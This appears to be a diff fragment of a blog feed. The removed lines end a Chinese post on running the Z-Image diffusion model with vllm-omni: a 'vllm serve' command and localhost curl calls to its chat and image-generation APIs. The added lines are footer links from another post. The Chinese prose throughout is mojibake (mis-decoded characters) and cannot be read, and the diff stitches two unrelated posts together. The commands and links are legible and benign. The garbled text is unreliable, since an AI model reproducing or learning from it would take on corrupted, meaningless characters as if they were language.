-<p>å¾ªç¯å¾å¤ï¼æä¸ä¸æ­¥å¾å°çãç¨å¾®æ¸æ°ä¸ç¹çå¾çä½ä¸ºæ°çè¾å¥ï¼åæ¬¡è®©æ¨¡åé¢æµå¹¶åå»åªå£°ã</p>
-<p>ç»ç¹ï¼éå¤å åæ­¥åï¼åªå£°è¢«éæ­¥ç§»é¤å¹²åï¼ä¸å¼ æ¸æ°çãç¬¦åä½ æè¿°çå¾çå°±è¯çäºã</p>
-<p>è¿ä¸ªä¸æ­¥æ­¥é¢æµå¹¶åå»åªå£°çå¾ªç¯ï¼ä»æ¹åä¸çæ¯ååå åªçâååâï¼ä»å¨ä½ä¸çå°±æ¯å¨âå»åªâã</p>
-<p><img src="https://img2024.cnblogs.com/blog/587720/202605/587720-20260524132014420-904364189.png" alt="image" loading="lazy"></p>
-<p>vllmæä¸çå­é¡¹ç®<a href="https://github.com/vllm-project/vllm-omni" title="vllm-omni" target="_blank" rel="noopener nofollow">vllm-omni</a>æä¾äºç®åãå¿«éä¸ä½ææ¬çå¤æ¨¡ææ¨¡åæå¡ã</p>
-<p><a href="https://www.modelscope.cn/models/Tongyi-MAI/Z-Image" title="Z-Image" target="_blank" rel="noopener nofollow">Z-Image</a>æ¯é¿éå¼æºçå®æ´çæ¬ãæªç»è¸é¦çç Transformer æçå¾æ¨¡åï¼ 10.26Bæéåæ°ï¼ 20.55GB GPUæ¾å­ï¼ ä¸ä¸ºé«è´¨éãå¼ºçæå¤æ ·æ§ãå¹¿æ³çé£æ ¼è¦çè½åä»¥åç²¾åçæç¤ºè¯éµå¾ªèè®¾è®¡ã</p>
-<p>å¯å¨æ¨çæå¡å¨ï¼<br>
-vllm serve Tongyi-MAI/Z-Image --omni --port 8000 --tensor-parallel-size 2</p>
-<blockquote>
-<p>æ³¨æï¼ ä¸æ¯ç¨åçvllm(å¯¹åºçdockeréåæ¯<a href="https://hub.docker.com/r/vllm/vllm-openai" title="vllm-openai" target="_blank" rel="noopener nofollow">vllm-openai</a>)å¸¦omniåæ°ï¼ èæ¯è¦ä¸ä¸ªåå«omniæ©å±çå¤æ¨¡ævllm (å¯¹åºçdockeréåæ¯<a href="https://hub.docker.com/r/vllm/vllm-omni" title="vllm-omni" target="_blank" rel="noopener nofollow">vllm-omni</a>)ã</p>
-</blockquote>
-<p>æ¯æä¸¤ç§æ¥å£ï¼ é½æ¯å¼å®¹openaiçæ¥å£</p>
-<ul>
-<li><a href="https://docs.vllm.ai/projects/vllm-omni/en/latest/serving/diffusion_chat_api/" title="Diffusion Chat Completions API" target="_blank" rel="noopener nofollow">Diffusion Chat Completions API</a>ï¼ å¸æå¨ç±»ä¼¼èå¤©æºå¨äººçå¤æ¨¡æãå¤è½®å¯¹è¯ä¸­éæå¾åçæè½å</li>
-</ul>
-<pre><code>curl -s http://localhost:8000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "messages": [
-      {"role": "user", "content": "A beautiful landscape painting"}
-    ],
-    "extra_body": {
-      "num_inference_steps": 50,
-      "seed": 42
-    }
-  }'
-</code></pre>
-<ul>
-<li><a href="https://docs.vllm.ai/projects/vllm-omni/en/latest/serving/image_generation_api/" title="Image Generation API" target="_blank" rel="noopener nofollow">Image Generation API</a> ï¼ ç¨³å®ãä¸æ³¨äºå¾åçæ</li>
-</ul>
-<p>è¾åºçäºè¿å¶å¾çè¢«base64 ç¼ç ï¼è§£ç å¯å¾å¾çã</p>
-<pre><code>curl -X POST http://localhost:8000/v1/images/generations \
-  -H "Content-Type: application/json" \
-  -d '{
-    "prompt": "a dragon laying over the spine of the Green Mountains of Vermont",
-    "size": "1024x1024",
-    "seed": 42
-  }' | jq -r '.data[0].b64_json' | base64 -d &gt; dragon.png
-</code></pre>
-<blockquote>
-<p>jq æ¯jsonæ ¼å¼åååå¼å·¥å·ï¼ ä»jsonååºä½å­æ®µä¸­åå¼ã</p>
-</blockquote>
-
-
-</div>
-<div id="MySignature" role="contentinfo">
-    <hr style="FILTER: alpha(opacity=100,finishopacity=0,style=3)" width="80%" color="#987cb9" size="3">
-<div style="text-align:center;">
-<p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼{ææåº¦çé©¬ç²}ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/JulianHuang/p/20141345" target="_blank">https://www.cnblogs.com/JulianHuang/p/20141345</a></p>
-<strong style="color: red; ">æ¬¢è¿å³æ³¨æçååææ¯ãèåºå¬ä¼å·ï¼ å å¥½åè°å¤©è¯´å°ï¼ä¸èµ·è¿å</strong>
-<div><img style="width: 250px;height:250px;" src="https://blog-static.cnblogs.com/files/JulianHuang/QR.gif"> </div>
-
-</div>
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-24 13:21">2026-05-24 13:20</span>&nbsp;
-<a href="https://www.cnblogs.com/JulianHuang">ç¥ä»å«ææ¶</a>&nbsp;
-éè¯»(<span id="post_view_count">3</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(20141345);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2FJulianHuang%2Fp%2F20141345&amp;targetId=20141345&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+<a href="javascript:void(0)" onclick="AddToWz(20143823);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2FFatTiger4399%2Fp%2F20143823&amp;targetId=20143823&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
 </div>
          ]]>
     </description>
